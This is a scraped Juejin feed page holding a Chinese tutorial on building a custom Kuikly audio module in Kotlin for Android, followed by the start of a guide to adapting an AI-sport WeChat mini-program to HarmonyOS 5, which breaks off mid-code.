itemprop="datePublished" content="2025-11-24T03:41:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="在下历飞雨"/> <meta itemprop="url" content="https://juejin.cn/user/1559379316800"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly 基础之封装自定义音频播放模块
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1559379316800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在下历飞雨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:41:08.000Z" title="Mon Nov 24 2025 03:41:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">第八篇：Kuikly基础之封装自定义模块（音频）</h2>
<p>之前为了让小青蛙能“呱”一声叫出来，我们走了条“野路子”：用一个看不见的<code>Video</code>组件来播放音频。虽然能用，但总感觉有点“名不正言不顺”，不够优雅，也埋下了隐患。</p>
<p>于是，我们决定对这个“野路子”进行改造，采用Kuikly的自定义模块机制，把它从一个“组件技巧”升级为一项独立的“模块能力”。整个过程不复杂，我们分三步走。</p>
<h3 data-id="heading-1">第一步：定义共享模块——AudioModule (shared)</h3>
<p>首先，在所有平台都能访问的<code>shared</code>端，我们定义一个<code>AudioModule</code>。它负责定义接口，比如“播放”或“停止”，但它自己不关心具体怎么实现。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: AudioModule.kt</span>

<span class="hljs-keyword">package</span> com.lifeiyu.singlefrog.modules
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.module.Module
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.nvi.serialization.json.JSONObject

<span class="hljs-comment">/**
 * 音频模块的共享部分，定义了跨平台使用的接口。
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioModule</span> : <span class="hljs-type">Module</span>() {
    <span class="hljs-comment">// 模块的唯一标识，平台端靠它来识别</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">moduleName</span><span class="hljs-params">()</span></span>: String { <span class="hljs-keyword">return</span> MODULE_NAME }

    <span class="hljs-comment">// 定义“播放”接口，通过 callNativeMethod 把任务派发给平台端</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">playAsset</span><span class="hljs-params">(assetPath: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">val</span> p = JSONObject(); p.put(<span class="hljs-string">"assetPath"</span>, assetPath)
        callNativeMethod(<span class="hljs-string">"playAsset"</span>, p, <span class="hljs-literal">null</span>)
    }

    <span class="hljs-comment">// 定义“停止”接口</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">stop</span><span class="hljs-params">()</span></span> { callNativeMethod(<span class="hljs-string">"stop"</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>) }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 模块名，两端要保持一致，像一个约定好的暗号</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MODULE_NAME = <span class="hljs-string">"HRAudioModule"</span>
    }
}
</code></pre>
<p>定义好后，得让每个页面都能用上它。所以我们在<code>BasePager</code>里把它注册成一个外部模块。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: BasePager.kt</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> com.lifeiyu.singlefrog.modules.AudioModule

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createExternalModules</span><span class="hljs-params">()</span></span>: Map&lt;String, Module&gt;? {
    <span class="hljs-keyword">val</span> m = hashMapOf&lt;String, Module&gt;()
    m[BridgeModule.MODULE_NAME] = BridgeModule()
    <span class="hljs-comment">// 把我们的音频模块也加进去</span>
    m[AudioModule.MODULE_NAME] = AudioModule()
    <span class="hljs-keyword">return</span> m
}
</code></pre>
<h3 data-id="heading-2">第二步：提供安卓端实现——KRAudioModule (Android)</h3>
<p><code>shared</code>端定义了接口，我们还需要在平台端提供具体的实现。在安卓这边，我们创建了<code>KRAudioModule</code>。</p>
<p>它继承<code>KuiklyRenderBaseModule</code>，通过重写<code>call</code>方法来响应来自<code>shared</code>端的调用。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: KRAudioModule.kt</span>

<span class="hljs-keyword">package</span> com.lifeiyu.singlefrog.module
<span class="hljs-keyword">import</span> android.media.MediaPlayer
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.render.android.export.KuiklyRenderBaseModule
<span class="hljs-comment">// ...</span>

<span class="hljs-comment">/**
 * 音频模块在安卓平台的具体实现。
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">KRAudioModule</span> : <span class="hljs-type">KuiklyRenderBaseModule</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> player: MediaPlayer? = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// 在这里接收并处理来自shared端的调用</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">call</span><span class="hljs-params">(method: <span class="hljs-type">String</span>, params: <span class="hljs-type">String</span>?, cb: <span class="hljs-type">KuiklyRenderCallback</span>?)</span></span>: Any? = <span class="hljs-keyword">when</span>(method){
        <span class="hljs-string">"playAsset"</span> -&gt; { <span class="hljs-comment">// 实现“播放”</span>
            <span class="hljs-keyword">val</span> path = JSONObject(params ?: <span class="hljs-string">"{}"</span>).optString(<span class="hljs-string">"assetPath"</span>)
            <span class="hljs-keyword">val</span> context = context ?: <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
            <span class="hljs-comment">// 下面就是安卓原生播放音频的逻辑了</span>
            <span class="hljs-keyword">val</span> afd = context.assets.openFd(path)
            <span class="hljs-keyword">val</span> mp = player ?: MediaPlayer().also { player = it }
            mp.reset()
            mp.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
            afd.close()
            mp.isLooping = <span class="hljs-literal">false</span>
            mp.prepare()
            mp.start()
            <span class="hljs-literal">null</span>
        }
        <span class="hljs-string">"stop"</span> -&gt; { <span class="hljs-comment">// 实现“停止”</span>
            player?.let { <span class="hljs-keyword">if</span> (it.isPlaying) it.stop(); it.reset() }
            <span class="hljs-literal">null</span>
        }
        <span class="hljs-keyword">else</span> -&gt; <span class="hljs-literal">null</span>
    }

    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-comment">// 同样的模块名，确保能和shared端对上</span>
        <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> MODULE_NAME = <span class="hljs-string">"HRAudioModule"</span>
    }
}
</code></pre>
<p>同样，这个实现也得在安卓项目里注册一下，这样系统才知道有这么个模块可用。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: KuiklyRenderActivity.kt</span>

<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">import</span> com.lifeiyu.singlefrog.module.KRAudioModule

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">registerExternalModule</span><span class="hljs-params">(kuiklyRenderExport: <span class="hljs-type">IKuiklyRenderExport</span>)</span></span> {
    <span class="hljs-comment">// ...</span>
    with(kuiklyRenderExport) {
        <span class="hljs-comment">// ...</span>
        <span class="hljs-comment">// 在这里注册，告诉系统 HRAudioModule 这个名称由 KRAudioModule 来实现</span>
        moduleExport(KRAudioModule.MODULE_NAME) { KRAudioModule() }
    }
}
</code></pre>
<h3 data-id="heading-3">第三步：在页面中使用模块</h3>
<p>准备工作都做好了，现在回到我们的<code>FrogMainPage</code>，看看如何使用这个新模块。过程非常直接。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// file: FrogMainPage.kt</span>

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrogMainPage</span> : <span class="hljs-type">BasePager</span>() {
    <span class="hljs-comment">// 声明一个变量来持有音频模块的实例</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> audioModule: AudioModule

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">created</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.created()
        <span class="hljs-comment">// 页面创建时，通过 acquireModule 获取模块实例</span>
        audioModule = acquireModule&lt;AudioModule&gt;(AudioModule.MODULE_NAME)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-comment">// ...</span>
        event {
            click {
                <span class="hljs-comment">// ...</span>
                <span class="hljs-comment">// 点击时，直接调用模块的接口</span>
                audioModule.playAsset(<span class="hljs-string">"audio/frog_sound.mp3"</span>)
            }
        }
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>现在，页面逻辑变得清爽多了。没有了隐藏的<code>Video</code>和复杂的<code>playControl</code>，只剩下一句清晰的方法调用。</p>
<h3 data-id="heading-4">小结：从“野路子”到“正规军”</h3>
<p>这次重构，我们把音频播放从一个依赖UI组件的“野路子”，转变成了一个独立的、平台无关的“模块能力”。这不仅仅是代码写法的改变，更是一种架构思维的进步。</p>
<ul>
<li><strong>职责更清晰</strong>：<code>shared</code>端定义能力，<code>platform</code>端负责实现，页面只管使用。</li>
<li><strong>代码更干净</strong>：页面不再关心音频是怎么播放的，耦合度大大降低。</li>
<li><strong>扩展性更强</strong>：未来想增加预加载、管理多个音效，都只需要在模块内部做文章，页面代码基本不用动。</li>
</ul>
<p>现在，我们项目里那声清脆的“呱”，背后有了一个更稳固的实现方式。感觉好多了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI运动小程序鸿蒙平台适配指南]]></title>    <link>https://juejin.cn/post/7575748159608635418</link>    <guid>https://juejin.cn/post/7575748159608635418</guid>    <pubDate>2025-11-24T04:03:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575748159608635418" data-draft-id="7575533124878778395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI运动小程序鸿蒙平台适配指南"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T04:03:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云智科技的技术小铺"/> <meta itemprop="url" content="https://juejin.cn/user/2491969751759002"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI运动小程序鸿蒙平台适配指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2491969751759002/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云智科技的技术小铺
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:03:13.000Z" title="Mon Nov 24 2025 04:03:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>鸿蒙5的首版发布距现在已快满一年了，同时伴随着华为终端芯片制造的突破，搭载有HarmonyOS5的终端及用户的保有量在不断的上升，各大厂商的APP也在逐渐适配鸿蒙生态，微信小程序生态也在逐渐适配成熟，移动端适配HarmonyOS生态已势在必行。今天我们就结合我们一段时间以来「Ai乐运动」用户的反馈、实测验证，来聊聊AI运动小程序在鸿蒙端的适配。
<strong>注：本文主要介绍适配鸿蒙5以及后的HarmonyOS Next纯血版鸿蒙版本，HarmonyOS 4及以前的版本因为还兼容Android生态、微信小程序运行时也与Android版本无差异，所以无需特别适配。</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/153034e9900745dc973dcd9e5354ce3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5pm656eR5oqA55qE5oqA5pyv5bCP6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561792&amp;x-signature=0ioYfJrPlENrJ95RyouqMl4%2FI9o%3D" alt="d52a2834349b033b620dd46d5e0782dcd739bddc" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-0">一、AI运动识别插件在鸿蒙5的实测表现</h2>
<p>使用版<code>v8.0.11</code>微信分别在<code>Harmony5.0.1</code>和<code>Harmony5.1.0</code>的实际测试结果如下：</p>













































<table><thead><tr><th align="center">功能</th><th align="center">功能表现</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">识别引擎ve1</td><td align="center">正常</td><td align="center"><em>但精度不佳</em>，与MTK芯片问题一致，开启<strong>增强模式</strong>即可解决</td></tr><tr><td align="center">识别引擎ve1，增强模式</td><td align="center">正常</td><td align="center">Harmony5+建议识别模式</td></tr><tr><td align="center">识别引擎ve1</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">骨骼图绘制</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">资态识别</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">运动识别检测</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">运动自定义扩展</td><td align="center">正常</td><td align="center"/></tr></tbody></table>
<blockquote>
<p>测试使用时的插件版本为当前最新版本<code>1.5.8</code>，从结果看<strong>AI运动识别插件</strong>的功能在鸿蒙5的表现不存在兼容性问题，可以正常使用。</p>
</blockquote>
<h2 data-id="heading-1">二、AI运动小程序在鸿蒙5的兼容性问题</h2>
<p>使用微信版本<code>v8.0.11</code>分别在<code>Harmony5.0.1</code>用<code>Harmony5.1.0</code>测试兼容问题主要表现在小程序的<code>Camera组件</code>，问题为<code>Camera</code>的非原生事件，即<code>Web</code>渲染层事件如<code>tap</code>、<code>touch___</code>相关事件完全不触发或偶尔触发但是没有冒泡向上传播，代码如下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"human-detection"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"videoStyles"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onWrapperClick"</span>&gt;</span>
		<span class="hljs-comment">&lt;!--原生initdone、error事件能正常触发，但是渲染层事件tap不触发，或者偶尔触发但不冒泡--&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">camera</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span> <span class="hljs-attr">flash</span>=<span class="hljs-string">"off"</span> <span class="hljs-attr">:device-position</span>=<span class="hljs-string">"deviceKey"</span>
			<span class="hljs-attr">resolution</span>=<span class="hljs-string">"medium"</span> <span class="hljs-attr">frame-size</span>=<span class="hljs-string">"small"</span> @<span class="hljs-attr">initdone</span>=<span class="hljs-string">"onCameraReady"</span> @<span class="hljs-attr">error</span>=<span class="hljs-string">"onCameraError"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onCameraClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">camera</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>如果您的<code>AI运动小程序</code>依赖<code>Camera</code>组件的非原生事件来交互，如全屏模式下点击组件打开操作菜单等，在小程序运行时彻底修复上述问题之前，可以考虑先采用在<code>Camera</code>组件覆盖一个一样大小、透明的非原生组件如<code>view</code>来解决此问题，代码如何下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"human-detection"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"videoStyles"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onWrapperClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">camera</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span> <span class="hljs-attr">flash</span>=<span class="hljs-string">"off"</span> <span class="hljs-attr">:device-position</span>=<span class="hljs-string">"deviceKey"</span>
			<span class="hljs-attr">resolution</span>=<span class="hljs-string">"medium"</span> <span class="hljs-attr">frame-size</span>=<span class="hljs-string">"small"</span> @<span class="hljs-attr">initdone</span>=<span class="hljs-string">"onCameraReady"</span> @<span class="hljs-attr">error</span>=<span class="hljs-string">"onCameraError"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onCameraClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">camera</span>&gt;</span>
		<span class="hljs-comment">&lt;!--增加一个遮罩层来承担交互，保证非原生事件能正常触发--&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hramony-fix"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>{
